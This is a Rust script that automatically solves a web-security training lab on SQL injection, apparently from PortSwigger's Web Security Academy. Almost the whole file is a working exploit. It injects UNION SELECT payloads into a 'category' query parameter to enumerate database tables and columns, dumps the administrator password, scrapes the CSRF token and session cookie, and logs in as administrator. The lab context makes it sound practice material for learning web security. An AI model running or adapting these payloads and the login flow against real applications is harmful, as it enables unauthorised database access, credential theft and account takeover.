/*************************************************************************************
*
* Lab: SQL injection attack, listing the database contents on non-Oracle databases
*
* Hack Steps:
*      1. Inject payload into 'category' query parameter to retrieve the name of
*         users table
*      2. Adjust the payload to retrieve the names of username and password columns
*      3. Adjust the payload to retrieve the administrator password
*      4. Fetch the login page
*      5. Extract the csrf token and session cookie
*      6. Login as the administrator
*      7. Fetch the administrator profile
*
**************************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aac005c035282688a4b41ea00a000e4.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
    print!("⦗1⦘ Injecting a payload to retrieve the name of users table.. ");
    flush_terminal();

    let mut payload = format!("' union SELECT table_name, null from information_schema.tables-- -");
    let mut injection = fetch(&format!("/filter?category={payload}"));
    let mut response_body = injection.text().unwrap();
    let users_table = capture_pattern_from_text("<th>(users_.*)</th>", &response_body);

    println!("{} => {}", "OK".green(), users_table.yellow());
    print!("⦗2⦘ Adjusting the payload to retrieve the names of username and password columns.. ");
    flush_terminal();

    payload = format!("' union SELECT column_name, null from information_schema.columns where table_name = '{users_table}'-- -");
    injection = fetch(&format!("/filter?category={payload}"));
    response_body = injection.text().unwrap();
    let username_column = capture_pattern_from_text("<th>(username_.*)</th>", &response_body);
    let password_column = capture_pattern_from_text("<th>(password_.*)</th>", &response_body);

    println!(
        "{} => {} | {}",
        "OK".green(),
        username_column.yellow(),
        password_column.yellow()
    );
    print!("⦗3⦘ Adjusting the payload to retrieve the administrator password.. ");
    flush_terminal();

    payload = format!("' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -");
    injection = fetch(&format!("/filter?category={payload}"));
    response_body = injection.text().unwrap();
    let admin_password = capture_pattern_from_text("<td>(.*)</td>", &response_body);

    println!("{} => {}", "OK".green(), admin_password.yellow());
    print!("⦗4⦘ Fetching the login page.. ");
    flush_terminal();

    let fetch_login = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let session = get_session_cookie(&fetch_login);
    let csrf_token = get_csrf_token(fetch_login);

    println!("{}", "OK".green());
    print!("⦗6⦘ Logging in as the administrator.. ");
    flush_terminal();

    let admin_login = login_as_admin(&admin_password, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗7⦘ Fetching the administrator profile.. ");
    flush_terminal();

    let admin_session = get_session_cookie(&admin_login);
    fetch_with_session("/my-account", &admin_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(10))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_admin(admin_password: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to login as the administrator".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
